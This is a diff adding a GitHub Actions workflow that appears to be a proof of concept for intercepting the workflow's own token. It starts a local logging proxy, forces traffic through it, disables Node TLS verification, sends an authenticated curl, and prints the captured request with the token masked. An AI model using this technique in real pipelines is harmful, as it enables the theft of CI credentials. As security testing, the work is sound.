@@ -1,0 +1,63 @@
+name: MITM-Proof-V3
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  mitm:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start proxy and set env
+        run: |
+          cat > /tmp/proxy.py << 'PYEOF'
+import socket, threading, os
+def handle(conn, addr):
+    data = conn.recv(4096)
+    with open('/tmp/captured.txt', 'ab') as f:
+        f.write(data)
+        f.write(b"\n")
+    conn.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
+    try:
+        data2 = conn.recv(8192)
+        with open('/tmp/captured.txt', 'ab') as f:
+            f.write(b"POST_CONNECT:\n")
+            f.write(data2)
+            f.write(b"\n")
+    except: pass
+    conn.close()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('127.0.0.1', 9999))
+s.listen(5)
+s.settimeout(30)
+try:
+    while True:
+        conn, addr = s.accept()
+        threading.Thread(target=handle, args=(conn, addr)).start()
+except: pass
+s.close()
+PYEOF
+          python3 /tmp/proxy.py &
+          sleep 1
+          echo "https_proxy=http://127.0.0.1:9999" >> $GITHUB_ENV
+          echo "NODE_TLS_REJECT_UNAUTHORIZED=0" >> $GITHUB_ENV
+
+      - name: Call API with token through proxy
+        env:
+          TOKEN: ${{ github.token }}
+        run: |
+          curl --connect-timeout 5 -H "Authorization: Bearer $TOKEN" https://api.github.com/user 2>/dev/null || true
+          sleep 2
+
+      - name: Show captured data
+        run: |
+          echo "=== CAPTURED ==="
+          if [ -f /tmp/captured.txt ]; then
+            wc -c < /tmp/captured.txt
+            cat /tmp/captured.txt | sed 's/ghs_[A-Za-z0-9]*/ghs_[CAPTURED]/g' | head -20
+            grep -c "CONNECT" /tmp/captured.txt && echo "CONNECT request captured"
+          else
+            echo "Nothing captured"
+          fi
